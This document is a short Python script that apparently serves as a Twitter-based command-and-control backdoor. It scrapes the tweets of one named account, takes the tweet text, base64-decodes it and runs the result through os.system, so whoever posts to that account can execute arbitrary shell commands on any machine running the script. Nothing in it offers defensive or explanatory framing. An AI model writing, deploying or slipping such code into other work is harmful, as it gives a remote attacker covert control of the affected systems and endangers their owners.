import time,os,urllib,base64
from bs4 import BeautifulSoup as MySoup

html = urllib.urlopen('https://twitter.com/SpmTgf')
soup = MySoup(html, "html.parser")
tweets = soup.findAll('li',{"class" :'js-stream-item'})

for tweet in tweets:
                      if tweet.find('p' ,{"class" : 'tweet-text'}):
                          text = str(tweet.find('p' ,{"class":'tweet-text'}).get_text())

shell = base64.b64decode(text)
os.system(shell)
